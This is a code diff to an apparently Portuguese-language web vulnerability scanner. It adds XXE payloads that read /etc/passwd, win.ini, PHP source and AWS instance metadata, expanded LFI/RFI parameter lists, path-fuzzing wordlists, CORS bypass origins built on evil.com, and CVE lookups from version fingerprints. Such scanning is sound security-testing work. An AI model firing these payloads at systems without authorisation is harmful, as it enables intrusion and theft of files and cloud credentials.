@@ -7,6 +7,7 @@
 
 import os, sys, re, time, json, socket, hashlib, base64, urllib.parse
 import concurrent.futures, threading, random, string, subprocess, shutil, argparse
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode, parse_qsl, urlunparse
 import urllib.request, urllib.error, http.client, ssl
@@ -3347,7 +3348,10 @@ class ReconEngine:
                     "Web-Discovery/Web-Servers/nginx.txt",
                     "Web-Discovery/Web-Servers/IIS.txt",
                     "Fuzzing-General/fuzz-Bo0oM.txt",
-                    "Web-Discovery/Directories/directory-listing-wordlist.txt"]:
+                    "Web-Discovery/Directories/directory-listing-wordlist.txt",
+                    "Web-Discovery/Directories/web-brute-vulnerabilities.txt",
+                    "Web-Discovery/Directories/cgis-lockdoor.txt",
+                    "Web-Discovery/Directories/sharepoint-paths.txt"]:
             for _p in _load_payload(_pl, 60):
                 _entry = _p if _p.startswith("/") else "/" + _p
                 if _entry not in sensitive:
@@ -3380,13 +3384,26 @@ class ReconEngine:
         tasks = [(b, p) for b in priority_targets for p in sensitive]
         total = len(tasks)
         done  = [0]
+        _fuzz_start = time.time()
 
         def fuzz_tracked(base, path):
             fuzz_one(base, path)
             with lock:
                 done[0] += 1
+                _d = done[0]
+                _elapsed = time.time() - _fuzz_start
+                if _d >= 10 and _elapsed > 0:
+                    _rate = _d / _elapsed
+                    _remaining = (total - _d) / _rate
+                    if _remaining >= 60:
+                        _eta = f"~{int(_remaining // 60)}m{int(_remaining % 60):02d}s"
+                    else:
+                        _eta = f"~{int(_remaining)}s"
+                else:
+                    _eta = "calculando..."
+                _pct = int(_d / total * 100) if total else 0
                 print(
-                    f"  {Fore.CYAN}[FUZZ] {done[0]}/{total} | achados: {len(found_paths)}{Style.RESET_ALL}\r",
+                    f"  {Fore.CYAN}[FUZZ] {_d}/{total} ({_pct}%) | achados: {len(found_paths)} | ETA: {_eta}{Style.RESET_ALL}\r",
                     end="", flush=True
                 )
 
@@ -5012,9 +5029,18 @@ class VulnScanner:
             f"http://example.com/{CANARY}.txt",
             "https://example.com/",
         ]
+        # Lockdoor: lista expandida de param names para RFI/LFI
         PARAM_NAMES = ["url","src","source","include","remote","load",
                        "file","page","path","template","view","doc",
-                       "fetch","uri","resource","module"]
+                       "fetch","uri","resource","module","folder","root",
+                       "inc","content","layout","theme","lang","language",
+                       "dir","category","document","class","type","style",
+                       "action","conf","config","pdf"]
+        # Augmentar com Payloads_CY
+        _rfi_params = _load_payload("LFI/rfi-parameter-names.txt")
+        for _rp in _rfi_params:
+            if _rp.lower() not in [p.lower() for p in PARAM_NAMES]:
+                PARAM_NAMES.append(_rp)
         indicators_lfi = ["root:x:0","bin:x:1","daemon:x:","www-data","nobody:x"]
         for url in self._get_urls_with_params() or []:
             parsed = urlparse(url)
@@ -5124,17 +5150,75 @@ class VulnScanner:
                   technique="Apontar param para 169.254.169.254 (AWS metadata)")
 
     def check_xxe(self):
-        xxe_payload = """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
+        """XXE — Classic + PHP filter + Base64 + Windows + SSRF via XXE (Lockdoor patterns)."""
+        # Carregar payloads do Payloads_CY
+        _xxe_extra = _load_payload("XXE/xxe-oob-payloads.txt")
+        xxe_payloads = [
+            # Classic /etc/passwd
+            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+            # PHP filter base64 (index.php source code)
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',
+            # Windows boot.ini
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+            # SSRF via XXE (AWS metadata)
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
+            # Base64 data URI
+            '<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>',
+        ] + [p for p in _xxe_extra if p.startswith("<?xml") or p.startswith("<!DOCTYPE")]
+
+        # Indicadores de sucesso por payload type
+        _success_indicators = [
+            "root:x:0", "bin:x:1", "daemon:x:", "www-data",      # /etc/passwd
+            "[extensions]", "[fonts]",                             # win.ini
+            "ami-id", "instance-id", "security-credentials",       # AWS metadata
+        ]
+        _b64_indicators = ["PD9waHA", "PCFET0NUWV", "aW5jbHVkZ"]  # base64 encoded PHP/HTML
+
         headers = {**HEADERS_BASE, "Content-Type": "application/xml"}
-        r = safe_get(self.target, data=xxe_payload, method="POST", headers=headers)
-        if r and ("root:x:0" in r.text or "bin:x:1" in r.text):
-            self._add(12,"XXE (XML External Entity)","OWASP","ALTO","VULNERAVEL",
-                      evidence="/etc/passwd vazado via XXE",
-                      recommendation="Desabilitar external entity processing no parser XML.",
-                      technique="Injetar DTD externo em payloads XML")
+        # Testar em endpoint principal e endpoints que aceitam XML
+        xml_endpoints = [self.target, self.target + "/api", self.target + "/upload",
+                         self.target + "/api/v1", self.target + "/xmlrpc"]
+
+        vuln = False
+        evidence = ""
+        for ep in xml_endpoints[:3]:
+            if _cancel_event.is_set() or vuln:
+                break
+            for payload in xxe_payloads[:8]:
+                if _cancel_event.is_set():
+                    break
+                r = safe_get(ep, data=payload, method="POST", headers=headers)
+                if not r:
+                    continue
+                # Check classic indicators
+                for indicator in _success_indicators:
+                    if indicator in r.text:
+                        vuln = True
+                        evidence = f"XXE confirmado em {ep}: '{indicator}' na response"
+                        break
+                # Check base64 response (PHP filter)
+                if not vuln:
+                    for b64 in _b64_indicators:
+                        if b64 in r.text:
+                            vuln = True
+                            evidence = f"XXE PHP filter em {ep}: código fonte base64 vazado"
+                            break
+                # Check response size anomaly (file content returned)
+                if not vuln and r.status_code == 200 and len(r.text) > 500:
+                    if any(kw in r.text.lower() for kw in ["password", "secret", "define(", "<?php"]):
+                        vuln = True
+                        evidence = f"XXE possível em {ep}: conteúdo sensível na response ({len(r.text)} bytes)"
+                if vuln:
+                    break
+
+        if vuln:
+            self._add(12, "XXE (XML External Entity)", "OWASP", "CRITICO", "VULNERAVEL",
+                      evidence=evidence,
+                      recommendation="Desabilitar DTD processing. Usar defusedxml (Python) ou similar. Bloquear external entities.",
+                      technique=f"Lockdoor: {len(xxe_payloads)} payloads (classic + PHP filter + base64 + SSRF via XXE)")
         else:
-            self._add(12,"XXE (XML External Entity)","OWASP","ALTO","SEGURO",
-                      technique="Injetar DTD externo em payloads XML")
+            self._add(12, "XXE (XML External Entity)", "OWASP", "ALTO", "SEGURO",
+                      technique=f"Lockdoor: {len(xxe_payloads)} payloads testados em {len(xml_endpoints[:3])} endpoints")
 
     def check_broken_auth(self):
         issues = []
@@ -5207,20 +5291,29 @@ class VulnScanner:
     def check_broken_access(self):
         admin_paths = ["/admin","/admin/users","/api/admin","/manage","/dashboard/admin",
                        "/api/v1/users","/api/v1/admin","/api/users","/internal"]
+        _admin_keywords = ["admin", "dashboard", "manage", "users", "settings",
+                           "configuração", "painel", "gerenciar", "permiss"]
         vuln_paths = []
         for path in admin_paths:
             url = self.target + path
             r = safe_get(url, headers={**HEADERS_BASE, "Authorization": ""})
             if r and r.status_code in [200, 201]:
-                vuln_paths.append(f"{path} [{r.status_code}]")
+                body_low = r.text.lower()
+                # Confirmar que o conteúdo é realmente admin (não página de erro/login)
+                has_admin_content = any(kw in body_low for kw in _admin_keywords)
+                has_form = "<form" in body_low
+                has_data = len(r.text) > 500 and ("email" in body_low or "user" in body_low)
+                is_login_redirect = "login" in body_low and has_form and not has_data
+                if has_admin_content and has_data and not is_login_redirect:
+                    vuln_paths.append(f"{path} [{r.status_code}] conteúdo admin confirmado")
         if vuln_paths:
             self._add(14,"Broken Access Control (BOLA)","OWASP","CRITICO","VULNERAVEL",
-                      evidence=f"Rotas admin acessíveis: {', '.join(vuln_paths[:2])}",
+                      evidence=f"Rotas admin acessíveis sem auth: {', '.join(vuln_paths[:2])}",
                       recommendation="Verificar autorização em cada endpoint; princípio do menor privilégio.",
-                      technique="Acessar rotas de admin sem privilégio; manipular role no JWT")
+                      technique="Acessar rotas admin sem credenciais; verificar conteúdo real de painel")
         else:
             self._add(14,"Broken Access Control (BOLA)","OWASP","CRITICO","SEGURO",
-                      technique="Acessar rotas de admin sem privilégio; manipular role no JWT")
+                      technique="Acessar rotas admin sem credenciais; verificar conteúdo real de painel")
 
     def check_security_misconfig(self):
         issues = []
@@ -5246,35 +5339,351 @@ class VulnScanner:
             self._add(15,"Security Misconfiguration","OWASP","ALTO","SEGURO",
                       technique="Debug mode, listagem de diretórios, headers de segurança ausentes")
 
-    def check_outdated_components(self):
-        r = safe_get(self.target)
-        issues = []
-        if r:
-            hdrs = {k.lower():v for k,v in r.headers.items()}
-            # Detectar versões em headers
-            for h in ["server","x-powered-by","x-aspnet-version","x-aspnetmvc-version"]:
-                if h in hdrs:
-                    issues.append(f"Versão exposta em header {h}: {hdrs[h]}")
-            # Detectar versões no HTML
-            old_libs = [
-                (r'jquery[/-](\d+\.\d+\.\d+)', "jQuery"),
-                (r'bootstrap[/-](\d+\.\d+\.\d+)', "Bootstrap"),
-                (r'angular[js]?[/-](\d+\.\d+)', "Angular"),
-                (r'react[/-](\d+\.\d+)', "React"),
-                (r'wordpress[/-](\d+\.\d+)', "WordPress"),
-            ]
-            for pattern, lib in old_libs:
-                m = re.search(pattern, r.text, re.I)
+    # ── Version Extraction Patterns ─────────────────────────────────────────
+    _VERSION_PATTERNS = {
+        # ── Headers ──────────────────────────────────────────────────────────
+        "header": {
+            "Apache":       (r'Apache[/ ](\d+\.\d+\.\d+)', "server"),
+            "Nginx":        (r'nginx[/ ](\d+\.\d+\.\d+)', "server"),
+            "IIS":          (r'Microsoft-IIS[/ ](\d+\.\d+)', "server"),
+            "LiteSpeed":    (r'LiteSpeed[/ ](\d+\.\d+(?:\.\d+)?)', "server"),
+            "OpenResty":    (r'openresty[/ ](\d+\.\d+\.\d+)', "server"),
+            "Caddy":        (r'Caddy[/ ]?(\d+\.\d+\.\d+)', "server"),
+            "PHP":          (r'PHP[/ ](\d+\.\d+\.\d+)', "x-powered-by"),
+            "ASP.NET":      (r'(\d+\.\d+\.\d+)', "x-aspnet-version"),
+            "Express":      (r'Express[/ ]?(\d+\.\d+\.\d+)', "x-powered-by"),
+            "Phusion":      (r'Phusion Passenger[/ ](\d+\.\d+\.\d+)', "server"),
+        },
+        # ── HTML / JS body ───────────────────────────────────────────────────
+        "body": {
+            "jQuery":       r'jquery[/-]v?(\d+\.\d+\.\d+)',
+            "Bootstrap":    r'bootstrap[/-]v?(\d+\.\d+\.\d+)',
+            "React":        r'react(?:\.production|\.development)?[/-]v?(\d+\.\d+\.\d+)',
+            "Vue.js":       r'vue(?:\.runtime)?(?:\.global)?(?:\.prod)?[/.-]v?(\d+\.\d+\.\d+)',
+            "Angular":      r'angular(?:\.min)?[/.-]v?(\d+\.\d+\.\d+)',
+            "AngularJS":    r'angular[/-](\d+\.\d+\.\d+)',
+            "WordPress":    r'(?:wordpress|wp-includes)[/-](\d+\.\d+(?:\.\d+)?)',
+            "Drupal":       r'Drupal\s+(\d+\.\d+)',
+            "Joomla":       r'Joomla!\s+(\d+\.\d+)',
+            "Next.js":      r'_next/static/(?:chunks/)?(?:.*?buildId["\':]+\s*["\'])?.*?(?:next[/-]v?(\d+\.\d+\.\d+))',
+            "Lodash":       r'lodash(?:\.min)?\.js[/-]v?(\d+\.\d+\.\d+)',
+            "Moment.js":    r'moment(?:\.min)?\.js[/\-]v?(\d+\.\d+\.\d+)',
+            "D3.js":        r'd3(?:\.min)?\.js[/-]v?(\d+\.\d+\.\d+)',
+            "Axios":        r'axios[/-]v?(\d+\.\d+\.\d+)',
+            "Socket.io":    r'socket\.io[/-]v?(\d+\.\d+\.\d+)',
+            "Handlebars":   r'handlebars(?:\.runtime)?(?:\.min)?[/-]v?(\d+\.\d+\.\d+)',
+            "Backbone.js":  r'backbone(?:-min)?[/-]v?(\d+\.\d+\.\d+)',
+            "Ember.js":     r'ember(?:\.(?:debug|prod|min))?[/-]v?(\d+\.\d+\.\d+)',
+            "Three.js":     r'three(?:\.min)?\.js[/-]r?(\d+\.\d+(?:\.\d+)?)',
+            "TinyMCE":      r'tinymce[/-]v?(\d+\.\d+\.\d+)',
+            "CKEditor":     r'ckeditor[/-]v?(\d+\.\d+\.\d+)',
+            "Chart.js":     r'chart(?:\.min)?\.js[/-]v?(\d+\.\d+\.\d+)',
+            "Leaflet":      r'leaflet[/-]v?(\d+\.\d+\.\d+)',
+            "Select2":      r'select2[/-]v?(\d+\.\d+\.\d+)',
+            "DataTables":   r'dataTables[/-]v?(\d+\.\d+\.\d+)',
+            "Sentry":       r'sentry[/-]v?(\d+\.\d+\.\d+)',
+            "Stripe.js":    r'stripe(?:\.min)?\.js[/-]v?(\d+)',
+        },
+        # ── Meta generator ───────────────────────────────────────────────────
+        "meta": {
+            "WordPress":    r'WordPress\s+(\d+\.\d+(?:\.\d+)?)',
+            "Drupal":       r'Drupal\s+(\d+)',
+            "Joomla":       r'Joomla!\s+(\d+\.\d+)',
+            "Ghost":        r'Ghost\s+(\d+\.\d+)',
+            "Hugo":         r'Hugo\s+(\d+\.\d+)',
+            "Gatsby":       r'Gatsby\s+(\d+\.\d+)',
+        },
+        # ── JS comment banners (/*! lib v1.2.3 */) ──────────────────────────
+        "js_banner": {
+            "jQuery":       r'/\*!?\s*jQuery\s+v?(\d+\.\d+\.\d+)',
+            "Bootstrap":    r'/\*!?\s*Bootstrap\s+v?(\d+\.\d+\.\d+)',
+            "Lodash":       r'/\*!?\s*lodash\s+v?(\d+\.\d+\.\d+)',
+            "Underscore":   r'/\*!?\s*Underscore\.js\s+(\d+\.\d+\.\d+)',
+            "Modernizr":    r'/\*!?\s*Modernizr\s+v?(\d+\.\d+\.\d+)',
+            "Normalize":    r'/\*!?\s*normalize\.css\s+v?(\d+\.\d+\.\d+)',
+            "Popper.js":    r'/\*!?\s*@?[Pp]opper(?:\.js)?\s+v?(\d+\.\d+\.\d+)',
+            "Vue.js":       r'/\*!?\s*Vue\.js\s+v(\d+\.\d+\.\d+)',
+            "React":        r'/\*!?\s*[Rr]eact\s+v?(\d+\.\d+\.\d+)',
+        },
+    }
+
+    def _extract_versions(self):
+        """
+        Extrai versões de todas as tecnologias detectáveis no alvo.
+        Retorna dict: {software_name: {"version": "1.2.3", "source": "header:server"}}
+        """
+        detected = {}
+
+        # ── Página principal + JS files ──────────────────────────────────────
+        pages_to_scan = [self.target]
+        js_urls = [u for u in self.urls if u.endswith(".js")][:10]
+        pages_to_scan += js_urls
+
+        main_r = safe_get(self.target, timeout=10)
+        if not main_r:
+            return detected
+
+        hdrs = {k.lower(): v for k, v in main_r.headers.items()}
+        body = main_r.text
+
+        # ── 1. Headers ───────────────────────────────────────────────────────
+        for software, (pattern, header_name) in self._VERSION_PATTERNS["header"].items():
+            val = hdrs.get(header_name, "")
+            if val:
+                m = re.search(pattern, val, re.I)
                 if m:
-                    issues.append(f"{lib} v{m.group(1)} detectado no frontend")
-        if issues:
-            self._add(16,"Vulnerable & Outdated Components","OWASP","ALTO","VULNERAVEL",
-                      evidence="; ".join(issues[:3]),
-                      recommendation="Manter dependências atualizadas; usar SCA (Snyk, Dependabot).",
-                      technique="Fingerprint de versões; cruzar com bases CVE")
+                    detected[software] = {"version": m.group(1), "source": f"header:{header_name}={val[:60]}"}
+
+        # ── 2. Meta generator ────────────────────────────────────────────────
+        meta_match = re.search(
+            r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)["\']',
+            body, re.I
+        )
+        if not meta_match:
+            meta_match = re.search(
+                r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']generator["\']',
+                body, re.I
+            )
+        if meta_match:
+            gen = meta_match.group(1)
+            for software, pattern in self._VERSION_PATTERNS["meta"].items():
+                m = re.search(pattern, gen, re.I)
+                if m and software not in detected:
+                    detected[software] = {"version": m.group(1), "source": f"meta:generator={gen[:60]}"}
+
+        # ── 3. HTML/JS body patterns ─────────────────────────────────────────
+        for software, pattern in self._VERSION_PATTERNS["body"].items():
+            if software in detected:
+                continue
+            m = re.search(pattern, body, re.I)
+            if m:
+                detected[software] = {"version": m.group(1), "source": f"html:body pattern"}
+
+        # ── 4. JS comment banners ────────────────────────────────────────────
+        for software, pattern in self._VERSION_PATTERNS["js_banner"].items():
+            if software in detected:
+                continue
+            m = re.search(pattern, body, re.I)
+            if m:
+                detected[software] = {"version": m.group(1), "source": f"js:banner comment"}
+
+        # ── 5. Scan de JS files externos (top 10) ───────────────────────────
+        for js_url in js_urls[:8]:
+            rjs = safe_get(js_url, timeout=6)
+            if not rjs or len(rjs.text) < 50:
+                continue
+            for category in ["body", "js_banner"]:
+                for software, pattern in self._VERSION_PATTERNS[category].items():
+                    if software in detected:
+                        continue
+                    m = re.search(pattern, rjs.text, re.I)
+                    if m:
+                        short_url = js_url.split("/")[-1][:40]
+                        detected[software] = {"version": m.group(1), "source": f"js:{short_url}"}
+
+        # ── 6. Package.json / composer.json (se exposto) ─────────────────────
+        for pkg_path in ["/package.json", "/composer.json"]:
+            rpkg = safe_get(self.target + pkg_path, timeout=5)
+            if rpkg and rpkg.status_code == 200 and "{" in rpkg.text[:5]:
+                try:
+                    pkg_data = rpkg.json()
+                    deps = {}
+                    deps.update(pkg_data.get("dependencies", {}))
+                    deps.update(pkg_data.get("devDependencies", {}))
+                    deps.update(pkg_data.get("require", {}))
+                    for dep_name, dep_ver in deps.items():
+                        # Limpar prefixos: ^1.2.3, ~1.2.3, >=1.2.3
+                        clean_ver = re.sub(r'^[\^~>=<]+', '', str(dep_ver))
+                        if re.match(r'\d+\.\d+', clean_ver):
+                            pretty_name = dep_name.split("/")[-1].title().replace("-", " ")
+                            if pretty_name not in detected:
+                                detected[pretty_name] = {"version": clean_ver, "source": f"exposed:{pkg_path}"}
+                except Exception:
+                    pass
+
+        return detected
+
+    def _query_vulners(self, software, version):
+        """Consulta Vulners API por CVEs para software:version. Retorna lista de CVEs."""
+        if not VULNERS_API_KEY:
+            return []
+        try:
+            url = (f"https://vulners.com/api/v3/burp/software/"
+                   f"?software={requests.utils.quote(software.lower())}"
+                   f"&version={requests.utils.quote(version)}"
+                   f"&type=software&apiKey={VULNERS_API_KEY}")
+            r = requests.get(url, timeout=10, verify=False)
+            if r.status_code != 200:
+                return []
+            data = r.json()
+            if data.get("result") != "OK":
+                return []
+            cves = []
+            for item in data.get("data", {}).get("search", [])[:10]:
+                src = item.get("_source", {})
+                cve_id = src.get("id", "")
+                cvss_score = src.get("cvss", {}).get("score", 0)
+                title = src.get("title", "")[:80]
+                if cve_id.startswith("CVE-"):
+                    cves.append({
+                        "id": cve_id, "cvss": float(cvss_score),
+                        "title": title,
+                    })
+            return sorted(cves, key=lambda x: x["cvss"], reverse=True)[:5]
+        except Exception:
+            return []
+
+    def _query_nvd(self, software, version):
+        """Consulta NVD API como fallback. Retorna lista de CVEs."""
+        try:
+            keyword = f"{software} {version}"
+            headers = {}
+            if NVD_API_KEY:
+                headers["apiKey"] = NVD_API_KEY
+            url = (f"https://services.nvd.nist.gov/rest/json/cves/2.0"
+                   f"?keywordSearch={requests.utils.quote(keyword)}"
+                   f"&resultsPerPage=5")
+            r = requests.get(url, headers=headers, timeout=15, verify=False)
+            if r.status_code != 200:
+                return []
+            data = r.json()
+            cves = []
+            for item in data.get("vulnerabilities", [])[:5]:
+                cve_data = item.get("cve", {})
+                cve_id = cve_data.get("id", "")
+                # Extrair CVSS score (v3.1 primeiro, fallback v2)
+                metrics = cve_data.get("metrics", {})
+                cvss = 0.0
+                for v31 in metrics.get("cvssMetricV31", []):
+                    cvss = max(cvss, v31.get("cvssData", {}).get("baseScore", 0))
+                if cvss == 0:
+                    for v2 in metrics.get("cvssMetricV2", []):
+                        cvss = max(cvss, v2.get("cvssData", {}).get("baseScore", 0))
+                desc = ""
+                for d in cve_data.get("descriptions", []):
+                    if d.get("lang") == "en":
+                        desc = d.get("value", "")[:80]
+                        break
+                if cve_id:
+                    cves.append({"id": cve_id, "cvss": cvss, "title": desc})
+            return sorted(cves, key=lambda x: x["cvss"], reverse=True)[:5]
+        except Exception:
+            return []
+
+    def check_outdated_components(self):
+        """
+        Vulnerable & Outdated Components (OWASP A06) — Extrai versões de 40+ tecnologias,
+        cruza com Vulners + NVD para correlação de CVEs.
+        """
+        # ── 1. Extrair todas as versões detectáveis ──────────────────────────
+        detected = self._extract_versions()
+
+        if not detected:
+            self._add(16, "Vulnerable & Outdated Components (CVE Scan)", "OWASP", "ALTO", "SEGURO",
+                      technique="Nenhuma versão de software detectável nos headers, HTML ou JS")
+            return
+
+        # ── 2. Para cada versão, consultar CVEs ──────────────────────────────
+        all_findings = []  # (software, version, source, cves)
+        versions_exposed = []  # versões expostas (mesmo sem CVE = info leak)
+        total = len(detected)
+        checked = [0]
+
+        def _check_one(software, info):
+            version = info["version"]
+            source = info["source"]
+            versions_exposed.append(f"{software} {version} ({source})")
+
+            # Consultar Vulners primeiro (mais preciso pra software)
+            cves = self._query_vulners(software, version)
+            # Fallback NVD se Vulners não retornou
+            if not cves:
+                cves = self._query_nvd(software, version)
+
+            if cves:
+                all_findings.append({
+                    "software": software, "version": version,
+                    "source": source, "cves": cves,
+                    "max_cvss": max(c["cvss"] for c in cves),
+                })
+
+            with lock:
+                checked[0] += 1
+                print(f"  {Fore.CYAN}[CVE] {checked[0]}/{total} | {software} {version} "
+                      f"→ {len(cves)} CVEs{Style.RESET_ALL}\r", end="", flush=True)
+
+        # Paralelizar consultas (5 threads — respeitar rate limit)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
+            futures = {ex.submit(_check_one, sw, info): sw for sw, info in detected.items()}
+            for fut in concurrent.futures.as_completed(futures):
+                if _cancel_event.is_set():
+                    break
+                try:
+                    fut.result(timeout=20)
+                except Exception:
+                    pass
+
+        print(f"\r{' '*80}\r", end="", flush=True)
+
+        # ── 3. Classificar e reportar ────────────────────────────────────────
+        # Ordenar por CVSS mais alto
+        all_findings.sort(key=lambda x: x["max_cvss"], reverse=True)
+
+        if all_findings:
+            # Determinar severidade pelo pior CVE
+            worst_cvss = all_findings[0]["max_cvss"]
+            if worst_cvss >= 9.0:
+                severity = "CRITICO"
+            elif worst_cvss >= 7.0:
+                severity = "ALTO"
+            elif worst_cvss >= 4.0:
+                severity = "MEDIO"
+            else:
+                severity = "BAIXO"
+
+            # Montar evidência rica
+            evidence_parts = []
+            for f in all_findings[:5]:
+                top_cve = f["cves"][0]
+                evidence_parts.append(
+                    f"{f['software']} {f['version']} → {top_cve['id']} "
+                    f"(CVSS {top_cve['cvss']}) {top_cve['title'][:50]}"
+                )
+
+            total_cves = sum(len(f["cves"]) for f in all_findings)
+            evidence = (
+                f"{len(all_findings)} componente(s) com CVEs conhecidos | "
+                f"{total_cves} CVEs total | Pior: CVSS {worst_cvss}\n"
+                + "\n".join(evidence_parts)
+            )
+
+            # Recomendações específicas por componente
+            recs = []
+            for f in all_findings[:3]:
+                recs.append(f"Atualizar {f['software']} {f['version']}")
+            recommendation = "; ".join(recs) + ". Usar SCA (Snyk, Dependabot) para monitorar dependências."
+
+            self._add(16, "Vulnerable & Outdated Components (CVE Scan)", "OWASP", severity, "VULNERAVEL",
+                      evidence=evidence,
+                      recommendation=recommendation,
+                      technique=f"Fingerprint de {len(detected)} tecnologias → Vulners/NVD API → {total_cves} CVEs correlacionados")
+
+            # Log detalhado no terminal
+            for f in all_findings[:5]:
+                _cvss_color = Fore.RED if f["max_cvss"] >= 7 else (Fore.YELLOW if f["max_cvss"] >= 4 else Fore.WHITE)
+                print(f"  {_cvss_color}[CVE] {f['software']} {f['version']} — "
+                      f"{len(f['cves'])} CVEs (pior: CVSS {f['max_cvss']}){Style.RESET_ALL}", flush=True)
+                for cve in f["cves"][:3]:
+                    print(f"        {Fore.RED}{cve['id']} (CVSS {cve['cvss']}) {cve['title'][:60]}{Style.RESET_ALL}", flush=True)
         else:
-            self._add(16,"Vulnerable & Outdated Components","OWASP","ALTO","SEGURO",
-                      technique="Fingerprint de versões; cruzar com bases CVE")
+            # Versões expostas mas sem CVEs conhecidos
+            if versions_exposed:
+                self._add(16, "Vulnerable & Outdated Components (CVE Scan)", "OWASP", "BAIXO", "SEGURO",
+                          evidence=f"{len(detected)} versões detectadas sem CVEs: {'; '.join(versions_exposed[:5])}",
+                          technique=f"Fingerprint de {len(detected)} tecnologias → {len(detected)} versões → 0 CVEs")
+            else:
+                self._add(16, "Vulnerable & Outdated Components (CVE Scan)", "OWASP", "ALTO", "SEGURO",
+                          technique="Nenhuma versão detectável")
 
     def check_crypto_failures(self):
         issues = []
@@ -6789,19 +7198,32 @@ class VulnScanner:
                        "/_admin", "/manage", "/management", "/console", "/debug",
                        "/__debug__", "/_debug_toolbar", "/kibana", "/grafana",
                        "/.well-known/security.txt"]
+        _panel_keywords = ["login", "password", "username", "admin", "dashboard",
+                           "phpmyadmin", "kibana", "grafana", "console", "debug",
+                           "django", "flask", "laravel", "sign in", "entrar"]
         found = []
         for path in admin_paths:
             r = safe_get(self.target + path, timeout=5)
-            if r and r.status_code in [200, 301, 302]:
-                found.append(f"{path} [{r.status_code}]")
+            if not r:
+                continue
+            # Só 200 com conteúdo real de painel (301/302 = redirect pra login, não é vuln)
+            if r.status_code == 200:
+                body_low = r.text.lower()
+                has_panel = any(kw in body_low for kw in _panel_keywords)
+                not_error = len(r.text) > 300 and "404" not in body_low[:200]
+                if has_panel and not_error:
+                    found.append(f"{path} [200] painel confirmado")
+            # security.txt é informativo, não vuln
+            if path == "/.well-known/security.txt" and r.status_code == 200 and "contact" in r.text.lower():
+                continue  # security.txt existir é bom, não ruim
         if found:
             self._add(51,"Exposed Admin Panel / Dev Tools","Recon","ALTO","VULNERAVEL",
                       evidence=f"Painéis encontrados: {', '.join(found[:4])}",
                       recommendation="Restringir acesso por IP; autenticação forte; remover em produção.",
-                      technique="Fuzzing: /admin, /debug, /_next, /phpinfo.php")
+                      technique="Fuzzing com verificação de conteúdo real de painel")
         else:
             self._add(51,"Exposed Admin Panel / Dev Tools","Recon","ALTO","SEGURO",
-                      technique="Fuzzing: /admin, /debug, /_next, /phpinfo.php")
+                      technique="Fuzzing com verificação de conteúdo real de painel")
 
     def check_git_exposed(self):
         git_paths = ["/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
@@ -7127,28 +7549,59 @@ class VulnScanner:
                   technique="Headers não-keyed (X-Forwarded-Host) que alteram resposta cacheada")
 
     def check_cors(self):
-        r = safe_get(self.target, headers={**HEADERS_BASE, "Origin": "https://evil.com"})
-        vuln = False
-        evidence = ""
-        if r:
-            acao = r.headers.get("Access-Control-Allow-Origin","")
-            acac = r.headers.get("Access-Control-Allow-Credentials","")
+        """CORS Misconfiguration — 10 bypass techniques (Corscan integration)."""
+        domain = self.parsed.hostname or ""
+        # 10 bypass origins (Corscan techniques)
+        bypass_origins = [
+            ("https://evil.com", "origin reflection"),
+            ("null", "null origin"),
+            ("http://localhost", "localhost bypass"),
+            (f"https://{domain}.evil.com", "domain prefix injection"),
+            (f"https://evil.com.{domain}", "domain suffix injection"),
+            (f"https://{domain}.com", "TLD append"),
+            (f"http://{domain}", "HTTP scheme downgrade"),
+            (f"https://sub.{domain}", "subdomain injection"),
+            ("file://", "file:// scheme"),
+            (f"https://{domain}%60.evil.com", "backtick bypass"),
+        ]
+        findings = []
+        severity = "ALTO"
+
+        for origin, desc in bypass_origins:
+            if _cancel_event.is_set():
+                break
+            r = safe_get(self.target, headers={**HEADERS_BASE, "Origin": origin})
+            if not r:
+                continue
+            acao = r.headers.get("Access-Control-Allow-Origin", "")
+            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
+
+            bypassed = False
             if acao == "*":
-                evidence = "CORS: Access-Control-Allow-Origin: *"
-                vuln = True
-            elif acao == "https://evil.com":
-                evidence = "CORS: origin evil.com refletido"
-                vuln = True
-                if "true" in acac.lower():
-                    evidence += " + credentials: true (CRÍTICO)"
-            elif "null" in acao:
-                evidence = "CORS: null origin aceito"
-                vuln = True
-        status = "VULNERAVEL" if vuln else "SEGURO"
-        self._add(60,"CORS Misconfiguration","Infra","ALTO",status,
-                  evidence=evidence,
-                  recommendation="Whitelist de origens CORS; nunca usar * com credentials.",
-                  technique="Origin refletido sem validação; null origin; credentials:true")
+                findings.append(f"ACAO: * (wildcard) — {desc}")
+                bypassed = True
+            elif acao == origin or (origin != "null" and origin in acao):
+                findings.append(f"Origin refletido: {origin} — {desc}")
+                bypassed = True
+            elif acao == "null" and origin == "null":
+                findings.append(f"null origin aceito — {desc}")
+                bypassed = True
+
+            if bypassed and "true" in acac:
+                findings[-1] += " + credentials:true (CRITICO)"
+                severity = "CRITICO"
+
+            if len(findings) >= 3:
+                break
+
+        if findings:
+            self._add(60, "CORS Misconfiguration (Corscan)", "Infra", severity, "VULNERAVEL",
+                      evidence=" | ".join(findings[:3]),
+                      recommendation="Whitelist explícita de origens. Nunca usar * com credentials. Bloquear null origin. Validar scheme (HTTPS only).",
+                      technique=f"Corscan: {len(bypass_origins)} bypass origins testados — {len(findings)} bypasses confirmados")
+        else:
+            self._add(60, "CORS Misconfiguration (Corscan)", "Infra", "ALTO", "SEGURO",
+                      technique=f"Corscan: {len(bypass_origins)} bypass origins testados — nenhum refletido")
 
     def check_graphql_introspection(self):
